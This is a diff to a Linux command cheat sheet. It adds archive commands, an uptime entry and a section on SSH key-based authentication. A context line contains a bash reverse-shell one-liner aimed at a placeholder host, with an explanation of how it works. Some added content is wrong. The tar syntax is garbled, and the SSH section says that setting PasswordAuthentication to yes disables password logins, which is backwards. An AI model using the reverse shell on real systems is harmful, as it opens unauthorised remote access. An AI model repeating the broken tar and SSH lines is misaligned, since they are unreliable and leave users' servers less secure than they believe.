@@ -130,6 +130,7 @@ It allows us to have several different versions of a program installed. We can c
 You could also use it wrap other programs.
 
 The Shebang (#!):
+
 #!/bin/bash should be the first line of any bash script. The hash exclamation mark ( #! ) character sequence is referred to as the Shebang. Following it is the path to the interpreter (or program) that should be used to run (or interpret) the rest of the lines in the text file. (For Bash scripts it will be the path to Bash, but there are many other types of scripts and they each have their own interpreter.) The shebang must be on the very first line of the file (line 2 won't do, even if the first line is blank). There must also be no spaces before the # or between the ! and the path to the interpreter.
 Whilst you could use a relative path for the interpreter, most of the time you are going to want to use an absolute path. You will probably be running the same scripts from a variety of locations.
 It is possible to leave out the line with the shebang and still run the script but it is unwise. If you are at a terminal and running the Bash shell and you execute a script without a shebang then Bash will assume it is a Bash script. So this will only work assuming the user running the script is running it in a Bash shell and there are a variety of reasons why this may not be the case, which is dangerous.
@@ -180,7 +181,6 @@ Show file content:                cat <file>
 Print first lines of the file:    head [-<lines>] <file> (10 by default)
 Print last lines of the file:     tail [-<lines>] <file> (10 by default)
 Redirect input to file & stdout:  tee <file> (e.g.: ls -la | tee listing.txt)
-Print first line:                 head -1
 Print specific lines of a file:   sed -n '<start_line>[<end_line>]p' <file>
 Print columns from tabular data:  awk '{print "Min:", $3, "Max:", $2}' <file>
 Change directory:                 cd <directory> (.: current dir, ..: parent dir)
@@ -214,11 +214,14 @@ Interactive process viewer:       htop
 Kill a process:                   kill <pid> (we can send signals to the process to be killed: SIGTERM to allow cleanup (default), SIGKILL to avoid cleanup, SIGSTOP to stop a process)
 Block devices:                    lsblk
 Disk space usage:                 df -h
+Find out system uptime:           uptime (tells the current time, how long the system has been running and other stats)
 
-Decompress tar file:              tar -xvzf <file>
-Decompress zip file:              unzip <file>
+Create tar file:                  tar cfp < file | - > <dir> (use - to send to stdout)
+Decompress tar file:              tar xzfp < file | - >
+Compress into gzip file:          gzip <file> (-c: to stdout)
 Decompress gzip files (gz):       gzip -d <file>
 Compress into zip file:           zip -r <output> <input> (-e: encrypt)
+Decompress zip file:              unzip <file>
 
 Find differences between files:   diff <file1> <file2>
 Check file checksum:              echo "<hash> <filename>" | {md5sum | sha1sum | sha256sum | sha512sum} -c -
@@ -256,6 +259,18 @@ Download file using netcat:       printf 'GET /<relative_path> \n' | nc <host> <
 Download/upload file using SCP:   scp <source> <destination> e.g.: scp user@192.168.1.23:/root/file.txt transferred.txt | scp file.txt user@192.168.1.23:/home/user/transferred.txt
 Start reverse shell:              bash -i >& /dev/tcp/<host>/<port> 0>&1     (requires a bash shell, otherwise wrap it with 'bash -c "<command>"')
 The code to start a reverse shell runs a new interactive instance of bash (bash -i), on a TCP connection to the specified port on the specified host which is created for the duration of the bash process. Standard output and standard error are sent through this connection (>&), and standard input is read through this connection (0>&1 — this should be 0<&1 but 0>&1 works too).
+
+
+SSH with public-key authentication:
+
+It removes the need to enter a password every time you need to connect to a remote SSH host.
+We can create public/private key pairs to authenticate SSH connections with OpenSSH (apt-get install openssh-client -y).
+To generate a new key pair use the ssh-keygen command. This command will overwrite your old key pair and provision a new one. 
+Generate an RSA ssh key pair with 4096 bits using the command: ssh-keygen -t rsa -b 4096
+The command will prompt you for a file name. By default, the ssh key pairs are stored as id_rsa and id_rsa.pub in ~/.ssh for private key and public key, respectively. 
+You can protect your private key with a passphrase. In the case that someone gains access to your private key they won't be able to use it. The downside to passphrases is that you need to enter it every time you create a connection using SSH. You can temporarily cache your passphrase using ssh-agent so you don't have to enter it every time you connect.
+To use the SSH key pair you created, we need to copy the public key to the remote server we wish to manage with: ssh-copy-id <remote_user>@<host>. The command will prompt you to enter the SSH password. Once authenticated, the command appends the public key to the ~/.ssh/authorized_keys file. This file is a list of public keys that are allowed to log into that specific account on that specific server. Then, you should be able to SSH into the remote server without being prompted for a password (unless you entered a passphrase) as long as you keep your private key in your ~/.ssh directory.
+And with that, you have successfully used SSH key-based authentication. You can add an extra layer of security by disabling password logins. In file /etc/ssh/sshd_config uncomment and change to yes the value PasswordAuthentication. Then run: service ssh restart.
 
 
 Finding files: 
@@ -432,7 +447,7 @@ Some methods to add repos in Debian-based distros:
 Consider using snap, a command that manages snaps, packages that work across many different Linux distributions.
 
 Common commands in apt:
-* Install package:    sudo apt install <package>
+* Install package:    sudo apt install <package> (-y: automatic yes to prompts)
 * Remove package:     sudo apt remove <package>
 * Update package db:  sudo apt update
 * Upgrade packages:   sudo apt upgrade
